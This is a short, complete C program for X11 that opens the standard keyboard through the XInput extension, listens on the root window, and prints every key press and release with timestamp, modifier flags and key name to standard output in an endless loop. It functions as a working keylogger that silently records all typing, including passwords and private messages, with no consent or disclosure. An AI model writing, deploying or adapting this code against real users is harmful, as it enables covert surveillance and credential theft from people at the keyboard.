#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <X11/Xlib.h>
#include <X11/extensions/XInput.h>

static int KEY_PRESS_TYPE;
static int KEY_RELEASE_TYPE;

static void process_event( XDeviceKeyEvent *event )
{
    KeySym keysym;
    char time_buf[ 20 ] = { 0 };
    time_t now;

    /* resolve keysym */
    keysym = XKeycodeToKeysym( event->display , event->keycode , 0 );

    /* format timestamp */
    now = time( NULL );
    strftime( time_buf , 20 , "%d/%m/%Y %H:%M:%S" , localtime( &now ) );

    /* dump keystroke info */
    printf( "%s %c %c %c %c %c %c %c %c %i %s\n" ,
            time_buf ,
            event->type == KEY_PRESS_TYPE ? 'P' : 'R' ,
            event->state & ShiftMask ? 'S' : 's' ,
            event->state & LockMask ? 'L' : 'l' ,
            event->state & ControlMask ? 'C' : 'c' ,
            event->state & Mod1Mask ? 'A' : 'a' , /* alt */
            event->state & Mod2Mask ? 'N' : 'n' , /* num lock */
            event->state & Mod4Mask ? 'W' : 'w' , /* windows */
            event->state & Mod5Mask ? 'G' : 'g' , /* alt gr */
            event->keycode ,
            XKeysymToString( keysym ) );

    fflush( stdout );
}

static int get_keybord_id( Display *display , XID *xid )
{
    int i , n;
    XDeviceInfo *devices;

    /* get all input devices */
    devices = XListInputDevices( display , &n );

    for ( i = 0 ; i < n ; i++ )
    {
        /* tries to guess the real ketboard */
        if ( strcmp( devices[i].name , "AT Translated Set 2 keyboard" ) == 0 )
        {
            *xid = devices[i].id;
            return 1;
        }
    }

    XFreeDeviceList( devices );
    return 0;
}

int main( int argc , char *argv[] )
{
    Display *display;
    int screen;
    Window root;
    XID keyboard_id;
    XDevice *device;
    XEventClass event_class[ 2 ];

    /* open display */
    if ( display = XOpenDisplay( NULL ) , !display )
    {
        fprintf( stderr , "Cannot open display" );
        return EXIT_FAILURE;
    }

    /* get variables */
    screen = DefaultScreen( display );
    root = RootWindow( display , screen );

    /* lookup the keyboard */
    if ( !get_keybord_id( display , &keyboard_id ) )
    {
        fprintf( stderr , "No keyboards found" );
        return EXIT_FAILURE;
    }

    /* open device */
    if ( device = XOpenDevice( display , keyboard_id ), !device )
    {
        fprintf( stderr , "Cannot open device" );
        return EXIT_FAILURE;
    }

    /* register events */
    DeviceKeyPress( device , KEY_PRESS_TYPE , event_class[ 0 ] );
    DeviceKeyRelease( device , KEY_RELEASE_TYPE , event_class[ 1 ] );
    XSelectExtensionEvent( display , root , event_class , 2 );

    /* event loop */
    while ( 1 )
    {
        XEvent event;

        /* process the next event */
        XNextEvent( display , &event );
        process_event( ( XDeviceKeyEvent * )&event );
    }
}
